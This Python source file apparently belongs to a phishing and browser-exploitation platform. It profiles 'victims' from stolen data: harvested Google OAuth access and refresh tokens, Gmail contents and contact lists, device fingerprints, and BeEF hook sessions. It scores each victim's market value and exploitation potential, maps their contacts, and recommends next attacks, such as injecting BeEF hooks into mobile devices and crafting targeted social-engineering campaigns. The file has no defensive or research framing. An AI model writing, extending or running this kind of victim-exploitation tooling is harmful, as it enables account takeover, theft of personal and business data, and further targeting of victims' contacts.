"""
Victim Analyzer Engine
Advanced victim analysis, profiling, and intelligence extraction
"""

import os
import json
import time
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
from collections import defaultdict, Counter
import networkx as nx
import numpy as np
from dataclasses import dataclass

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class VictimProfile:
    """Comprehensive victim profile"""
    victim_id: str
    email: str
    basic_info: Dict[str, Any]
    fingerprint_data: Dict[str, Any]
    oauth_tokens: Dict[str, Any]
    gmail_data: Dict[str, Any]
    beef_session: Dict[str, Any]
    risk_assessment: Dict[str, Any]
    intelligence_score: float
    exploitation_potential: float
    network_connections: List[str]
    timeline_events: List[Dict[str, Any]]
    tags: List[str]
    created_at: datetime
    last_updated: datetime

@dataclass
class NetworkNode:
    """Network graph node"""
    node_id: str
    node_type: str  # victim, email, domain, company
    properties: Dict[str, Any]
    connections: List[str]
    centrality_score: float
    risk_level: str

@dataclass
class TimelineEvent:
    """Timeline event"""
    event_id: str
    victim_id: str
    event_type: str
    timestamp: datetime
    description: str
    metadata: Dict[str, Any]
    severity: str
    source: str

class VictimAnalyzer:
    """Advanced victim analysis engine"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.analysis_cache = {}
        self.network_graph = nx.Graph()
        self.timeline_cache = {}
        
        # Analysis configuration
        self.config = {
            "intelligence_weights": {
                "email_content": 0.3,
                "contact_network": 0.25,
                "business_intelligence": 0.2,
                "technical_capabilities": 0.15,
                "behavioral_patterns": 0.1
            },
            "risk_factors": {
                "high_value_domain": 0.3,
                "executive_level": 0.25,
                "financial_access": 0.2,
                "technical_role": 0.15,
                "security_awareness": 0.1
            },
            "exploitation_potential": {
                "gmail_access": 0.4,
                "beef_session": 0.3,
                "device_vulnerabilities": 0.2,
                "social_engineering": 0.1
            }
        }
    
    def analyze_victim(self, victim_id: str) -> VictimProfile:
        """Perform comprehensive victim analysis"""
        try:
            # Check cache first
            cache_key = f"victim_analysis:{victim_id}"
            if cache_key in self.analysis_cache:
                cached_data = self.analysis_cache[cache_key]
                if (datetime.now(timezone.utc) - cached_data["timestamp"]).seconds < 300:  # 5 min cache
                    return cached_data["profile"]
            
            # Gather victim data from multiple sources
            basic_info = self._get_victim_basic_info(victim_id)
            fingerprint_data = self._get_fingerprint_data(victim_id)
            oauth_tokens = self._get_oauth_tokens(victim_id)
            gmail_data = self._get_gmail_data(victim_id)
            beef_session = self._get_beef_session(victim_id)
            
            # Perform analysis
            risk_assessment = self._assess_risk_level(basic_info, gmail_data, beef_session)
            intelligence_score = self._calculate_intelligence_score(gmail_data, oauth_tokens)
            exploitation_potential = self._calculate_exploitation_potential(beef_session, fingerprint_data)
            network_connections = self._analyze_network_connections(victim_id, gmail_data)
            timeline_events = self._build_timeline(victim_id)
            tags = self._generate_tags(basic_info, risk_assessment, intelligence_score)
            
            # Create comprehensive profile
            profile = VictimProfile(
                victim_id=victim_id,
                email=basic_info.get("email", ""),
                basic_info=basic_info,
                fingerprint_data=fingerprint_data,
                oauth_tokens=oauth_tokens,
                gmail_data=gmail_data,
                beef_session=beef_session,
                risk_assessment=risk_assessment,
                intelligence_score=intelligence_score,
                exploitation_potential=exploitation_potential,
                network_connections=network_connections,
                timeline_events=timeline_events,
                tags=tags,
                created_at=basic_info.get("created_at", datetime.now(timezone.utc)),
                last_updated=datetime.now(timezone.utc)
            )
            
            # Cache the analysis
            self.analysis_cache[cache_key] = {
                "profile": profile,
                "timestamp": datetime.now(timezone.utc)
            }
            
            return profile
            
        except Exception as e:
            logger.error(f"Error analyzing victim {victim_id}: {e}")
            return None
    
    def _get_victim_basic_info(self, victim_id: str) -> Dict[str, Any]:
        """Get basic victim information"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.victims
            victim = collection.find_one({"_id": victim_id})
            
            if victim:
                return {
                    "email": victim.get("email", ""),
                    "country": victim.get("country", ""),
                    "city": victim.get("city", ""),
                    "created_at": victim.get("created_at"),
                    "last_seen": victim.get("last_seen"),
                    "ip_address": victim.get("ip_address", ""),
                    "user_agent": victim.get("user_agent", ""),
                    "referrer": victim.get("referrer", ""),
                    "campaign_id": victim.get("campaign_id", ""),
                    "validation_status": victim.get("validation_status", "pending"),
                    "market_value": victim.get("market_value", "unknown")
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting victim basic info: {e}")
            return {}
    
    def _get_fingerprint_data(self, victim_id: str) -> Dict[str, Any]:
        """Get device fingerprint data"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.fingerprints
            fingerprint = collection.find_one({"victim_id": victim_id})
            
            if fingerprint:
                return {
                    "canvas_fingerprint": fingerprint.get("canvas_fingerprint", ""),
                    "webgl_fingerprint": fingerprint.get("webgl_fingerprint", ""),
                    "audio_fingerprint": fingerprint.get("audio_fingerprint", ""),
                    "font_list": fingerprint.get("font_list", []),
                    "screen_resolution": fingerprint.get("screen_resolution", ""),
                    "timezone": fingerprint.get("timezone", ""),
                    "language": fingerprint.get("language", ""),
                    "platform": fingerprint.get("platform", ""),
                    "device_type": fingerprint.get("device_type", "unknown"),
                    "browser_version": fingerprint.get("browser_version", ""),
                    "analysis_results": fingerprint.get("analysis_results", {})
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting fingerprint data: {e}")
            return {}
    
    def _get_oauth_tokens(self, victim_id: str) -> Dict[str, Any]:
        """Get OAuth token information"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.oauth_tokens
            tokens = list(collection.find({"victim_id": victim_id}))
            
            oauth_data = {}
            for token in tokens:
                provider = token.get("provider", "unknown")
                oauth_data[provider] = {
                    "access_token": token.get("access_token", ""),
                    "refresh_token": token.get("refresh_token", ""),
                    "scope": token.get("scope", []),
                    "expires_at": token.get("expires_at"),
                    "created_at": token.get("created_at"),
                    "last_used": token.get("last_used"),
                    "is_valid": token.get("is_valid", False)
                }
            
            return oauth_data
            
        except Exception as e:
            logger.error(f"Error getting OAuth tokens: {e}")
            return {}
    
    def _get_gmail_data(self, victim_id: str) -> Dict[str, Any]:
        """Get Gmail access and intelligence data"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.gmail_access_logs
            gmail_log = collection.find_one({"victim_id": victim_id})
            
            if gmail_log:
                return {
                    "access_granted": gmail_log.get("access_granted", False),
                    "access_level": gmail_log.get("access_level", "none"),
                    "email_count": gmail_log.get("email_count", 0),
                    "contact_count": gmail_log.get("contact_count", 0),
                    "intelligence_score": gmail_log.get("intelligence_score", 0),
                    "business_intelligence": gmail_log.get("business_intelligence", {}),
                    "contact_network": gmail_log.get("contact_network", []),
                    "last_access": gmail_log.get("last_access"),
                    "access_method": gmail_log.get("access_method", ""),
                    "extracted_data": gmail_log.get("extracted_data", {})
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting Gmail data: {e}")
            return {}
    
    def _get_beef_session(self, victim_id: str) -> Dict[str, Any]:
        """Get BeEF session information"""
        try:
            if not self.mongodb:
                return {}
            
            collection = self.mongodb.beef_sessions
            session = collection.find_one({"victim_id": victim_id})
            
            if session:
                return {
                    "session_id": session.get("session_id", ""),
                    "is_active": session.get("is_active", False),
                    "browser_info": session.get("browser_info", {}),
                    "commands_executed": session.get("commands_executed", []),
                    "success_rate": session.get("success_rate", 0),
                    "last_command": session.get("last_command"),
                    "exploitation_level": session.get("exploitation_level", "none"),
                    "persistence_established": session.get("persistence_established", False),
                    "created_at": session.get("created_at"),
                    "last_activity": session.get("last_activity")
                }
            
            return {}
            
        except Exception as e:
            logger.error(f"Error getting BeEF session: {e}")
            return {}
    
    def _assess_risk_level(self, basic_info: Dict[str, Any], gmail_data: Dict[str, Any], beef_session: Dict[str, Any]) -> Dict[str, Any]:
        """Assess victim risk level"""
        risk_score = 0
        risk_factors = []
        
        # Email domain analysis
        email = basic_info.get("email", "")
        if email:
            domain = email.split("@")[-1].lower()
            
            # High-value domains
            high_value_domains = [
                "gmail.com", "outlook.com", "yahoo.com", "hotmail.com",
                "apple.com", "microsoft.com", "google.com", "amazon.com"
            ]
            
            if domain in high_value_domains:
                risk_score += 0.3
                risk_factors.append("high_value_domain")
            
            # Business domains
            if not any(free_domain in domain for free_domain in ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]):
                risk_score += 0.2
                risk_factors.append("business_domain")
        
        # Market value assessment
        market_value = basic_info.get("market_value", "unknown")
        if market_value == "high":
            risk_score += 0.25
            risk_factors.append("high_market_value")
        elif market_value == "critical":
            risk_score += 0.4
            risk_factors.append("critical_market_value")
        
        # Gmail access level
        if gmail_data.get("access_granted", False):
            risk_score += 0.2
            risk_factors.append("gmail_access")
            
            intelligence_score = gmail_data.get("intelligence_score", 0)
            if intelligence_score > 80:
                risk_score += 0.15
                risk_factors.append("high_intelligence_value")
        
        # BeEF session status
        if beef_session.get("is_active", False):
            risk_score += 0.3
            risk_factors.append("active_beef_session")
            
            if beef_session.get("persistence_established", False):
                risk_score += 0.2
                risk_factors.append("persistence_established")
        
        # Determine risk level
        if risk_score >= 0.8:
            risk_level = "critical"
        elif risk_score >= 0.6:
            risk_level = "high"
        elif risk_score >= 0.4:
            risk_level = "medium"
        else:
            risk_level = "low"
        
        return {
            "risk_level": risk_level,
            "risk_score": risk_score,
            "risk_factors": risk_factors,
            "assessment_date": datetime.now(timezone.utc)
        }
    
    def _calculate_intelligence_score(self, gmail_data: Dict[str, Any], oauth_tokens: Dict[str, Any]) -> float:
        """Calculate intelligence score based on available data"""
        score = 0
        
        # Gmail intelligence
        if gmail_data.get("access_granted", False):
            score += gmail_data.get("intelligence_score", 0) * 0.4
            
            # Email count factor
            email_count = gmail_data.get("email_count", 0)
            if email_count > 1000:
                score += 20
            elif email_count > 500:
                score += 15
            elif email_count > 100:
                score += 10
            
            # Contact network factor
            contact_count = gmail_data.get("contact_count", 0)
            if contact_count > 500:
                score += 15
            elif contact_count > 200:
                score += 10
            elif contact_count > 50:
                score += 5
        
        # OAuth scope analysis
        for provider, token_data in oauth_tokens.items():
            if token_data.get("is_valid", False):
                scope = token_data.get("scope", [])
                
                # High-value scopes
                high_value_scopes = [
                    "https://www.googleapis.com/auth/gmail.readonly",
                    "https://www.googleapis.com/auth/gmail.modify",
                    "https://www.googleapis.com/auth/drive.readonly",
                    "https://www.googleapis.com/auth/calendar.readonly"
                ]
                
                for scope_item in scope:
                    if scope_item in high_value_scopes:
                        score += 10
        
        return min(score, 100)  # Cap at 100
    
    def _calculate_exploitation_potential(self, beef_session: Dict[str, Any], fingerprint_data: Dict[str, Any]) -> float:
        """Calculate exploitation potential"""
        score = 0
        
        # BeEF session status
        if beef_session.get("is_active", False):
            score += 40
            
            # Command success rate
            success_rate = beef_session.get("success_rate", 0)
            score += success_rate * 0.3
            
            # Exploitation level
            exploitation_level = beef_session.get("exploitation_level", "none")
            if exploitation_level == "high":
                score += 20
            elif exploitation_level == "medium":
                score += 10
        
        # Device vulnerabilities
        device_type = fingerprint_data.get("device_type", "unknown")
        if device_type == "mobile":
            score += 10  # Mobile devices often have more vulnerabilities
        
        # Browser version analysis
        browser_version = fingerprint_data.get("browser_version", "")
        if "Chrome" in browser_version or "Firefox" in browser_version:
            score += 5  # Common browsers have known exploits
        
        return min(score, 100)  # Cap at 100
    
    def _analyze_network_connections(self, victim_id: str, gmail_data: Dict[str, Any]) -> List[str]:
        """Analyze victim's network connections"""
        connections = []
        
        # Extract contacts from Gmail data
        contact_network = gmail_data.get("contact_network", [])
        for contact in contact_network:
            if isinstance(contact, dict):
                email = contact.get("email", "")
                if email:
                    connections.append(email)
        
        # Add to network graph
        self.network_graph.add_node(victim_id, node_type="victim")
        
        for connection in connections:
            self.network_graph.add_node(connection, node_type="contact")
            self.network_graph.add_edge(victim_id, connection)
        
        return connections
    
    def _build_timeline(self, victim_id: str) -> List[TimelineEvent]:
        """Build victim timeline"""
        try:
            # Check cache first
            cache_key = f"timeline:{victim_id}"
            if cache_key in self.timeline_cache:
                cached_data = self.timeline_cache[cache_key]
                if (datetime.now(timezone.utc) - cached_data["timestamp"]).seconds < 300:
                    return cached_data["events"]
            
            events = []
            
            # Get activity logs
            if self.mongodb:
                collection = self.mongodb.activity_logs
                logs = list(collection.find({"victim_id": victim_id}).sort("timestamp", -1))
                
                for log in logs:
                    event = TimelineEvent(
                        event_id=log.get("_id", ""),
                        victim_id=victim_id,
                        event_type=log.get("action", "unknown"),
                        timestamp=log.get("timestamp", datetime.now(timezone.utc)),
                        description=log.get("description", ""),
                        metadata=log.get("metadata", {}),
                        severity=log.get("severity", "info"),
                        source=log.get("source", "system")
                    )
                    events.append(event)
            
            # Sort by timestamp
            events.sort(key=lambda x: x.timestamp, reverse=True)
            
            # Cache the timeline
            self.timeline_cache[cache_key] = {
                "events": events,
                "timestamp": datetime.now(timezone.utc)
            }
            
            return events
            
        except Exception as e:
            logger.error(f"Error building timeline: {e}")
            return []
    
    def _generate_tags(self, basic_info: Dict[str, Any], risk_assessment: Dict[str, Any], intelligence_score: float) -> List[str]:
        """Generate tags for victim"""
        tags = []
        
        # Risk level tags
        risk_level = risk_assessment.get("risk_level", "low")
        tags.append(f"risk_{risk_level}")
        
        # Market value tags
        market_value = basic_info.get("market_value", "unknown")
        tags.append(f"market_{market_value}")
        
        # Intelligence tags
        if intelligence_score > 80:
            tags.append("high_intelligence")
        elif intelligence_score > 60:
            tags.append("medium_intelligence")
        else:
            tags.append("low_intelligence")
        
        # Geographic tags
        country = basic_info.get("country", "")
        if country:
            tags.append(f"country_{country.lower()}")
        
        # Domain tags
        email = basic_info.get("email", "")
        if email:
            domain = email.split("@")[-1].lower()
            if domain in ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]:
                tags.append("personal_email")
            else:
                tags.append("business_email")
        
        return tags
    
    def analyze_bulk_victims(self, victim_ids: List[str]) -> Dict[str, VictimProfile]:
        """Analyze multiple victims in bulk"""
        results = {}
        
        for victim_id in victim_ids:
            try:
                profile = self.analyze_victim(victim_id)
                if profile:
                    results[victim_id] = profile
            except Exception as e:
                logger.error(f"Error analyzing victim {victim_id}: {e}")
        
        return results
    
    def get_network_graph(self) -> nx.Graph:
        """Get the complete network graph"""
        return self.network_graph
    
    def get_network_analysis(self) -> Dict[str, Any]:
        """Get network analysis metrics"""
        if not self.network_graph.nodes():
            return {}
        
        try:
            # Calculate centrality measures
            degree_centrality = nx.degree_centrality(self.network_graph)
            betweenness_centrality = nx.betweenness_centrality(self.network_graph)
            closeness_centrality = nx.closeness_centrality(self.network_graph)
            
            # Find key nodes
            key_nodes = sorted(degree_centrality.items(), key=lambda x: x[1], reverse=True)[:10]
            
            # Network metrics
            metrics = {
                "total_nodes": self.network_graph.number_of_nodes(),
                "total_edges": self.network_graph.number_of_edges(),
                "density": nx.density(self.network_graph),
                "average_clustering": nx.average_clustering(self.network_graph),
                "key_nodes": key_nodes,
                "degree_centrality": degree_centrality,
                "betweenness_centrality": betweenness_centrality,
                "closeness_centrality": closeness_centrality
            }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error analyzing network: {e}")
            return {}
    
    def get_victim_recommendations(self, victim_id: str) -> List[Dict[str, Any]]:
        """Get exploitation recommendations for victim"""
        profile = self.analyze_victim(victim_id)
        if not profile:
            return []
        
        recommendations = []
        
        # Gmail exploitation recommendations
        if profile.gmail_data.get("access_granted", False):
            recommendations.append({
                "type": "gmail_exploitation",
                "priority": "high",
                "description": "Gmail access available - extract business intelligence",
                "action": "analyze_email_content",
                "potential_value": profile.intelligence_score
            })
        
        # BeEF exploitation recommendations
        if profile.beef_session.get("is_active", False):
            recommendations.append({
                "type": "beef_exploitation",
                "priority": "high",
                "description": "Active BeEF session - execute advanced commands",
                "action": "execute_command_sequence",
                "potential_value": profile.exploitation_potential
            })
        elif profile.fingerprint_data.get("device_type") == "mobile":
            recommendations.append({
                "type": "beef_injection",
                "priority": "medium",
                "description": "Mobile device detected - inject BeEF hook",
                "action": "inject_beef_hook",
                "potential_value": 60
            })
        
        # Social engineering recommendations
        if profile.intelligence_score > 70:
            recommendations.append({
                "type": "social_engineering",
                "priority": "medium",
                "description": "High intelligence value - craft targeted social engineering",
                "action": "create_targeted_campaign",
                "potential_value": profile.intelligence_score * 0.8
            })
        
        # Sort by priority and potential value
        recommendations.sort(key=lambda x: (x["priority"] == "high", x["potential_value"]), reverse=True)
        
        return recommendations

# Global victim analyzer instance
victim_analyzer = None

def initialize_victim_analyzer(mongodb_connection=None, redis_client=None) -> VictimAnalyzer:
    """Initialize victim analyzer"""
    global victim_analyzer
    victim_analyzer = VictimAnalyzer(mongodb_connection, redis_client)
    return victim_analyzer

def get_victim_analyzer() -> VictimAnalyzer:
    """Get victim analyzer instance"""
    global victim_analyzer
    if victim_analyzer is None:
        victim_analyzer = VictimAnalyzer()
    return victim_analyzer
